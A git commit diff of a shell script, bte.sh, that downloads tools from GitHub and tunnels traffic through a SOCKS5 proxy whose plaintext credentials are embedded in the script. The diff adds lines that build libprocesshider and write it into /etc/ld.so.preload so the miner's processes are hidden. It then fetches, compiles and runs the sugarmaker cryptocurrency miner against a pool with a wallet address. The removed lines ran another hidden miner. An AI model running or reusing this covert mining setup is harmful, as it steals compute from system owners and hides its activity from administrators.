5e06ae2546be843ddd9383b9b816310af28f647a
adisubarja <92545387+adisubarja@users.noreply.github.com>
2022-08-23 22:15:46 +0700

    Update bte.sh

--- bte.sh
+++ bte.sh
@@ -1,14 +1,9 @@
-#!/bin/sh
-apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
-
-curl -fsSL https://deb.nodesource.com/setup_17.x | -E bash -
-apt-get install -y nodejs
-
-npm i -g node-process-hider
-
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+sudo apt-get install build-essential libcurl4-openssl-dev autotools-dev automake -y
 
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
@@ -17,7 +12,7 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 173.245.209.246:1080
+socks5 = 173.245.211.239:1080
 socks5_username = G0tNyyR4nJ
 socks5_password = N1DAYf9S7D
 END
@@ -26,9 +21,31 @@ END
 
 sleep .2
 
+echo " "
+echo " "
+
+echo "**"
+
 ./graftcp/graftcp curl ifconfig.me
 
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://github.com/optimus66a/a/raw/main/ann && chmod 700 ann && ./ann ann -p pkt1qqa56gl4m9g7nm5xqsasf55wd60kqwflg9sxchh https://stratum.zetahash.com http://pool.pktpool.io http://pool.pkteer.com http://pool.pkt.world/master 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
+echo "**"
+
+echo " "
+echo " "
+
+git clone https://github.com/hanifgz/libprocesshider.git
+cd libprocesshider;make
+sudo mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+cd ..
+
+
+
+./graftcp/graftcp git clone https://github.com/decryp2kanon/sugarmaker.git
+cd sugarmaker
+./autogen.sh
+./configure CFLAGS='-O3'
+make
+./sugarmaker -a YespowerNull -o stratum+tcps://stratum-asia.rplant.xyz:17017 -u web1qrl78aw74s4gyeg6xx0kp98zkkperxuyku0jlra.$(shuf -n 1 -i 1-9999999) -p c=BTE
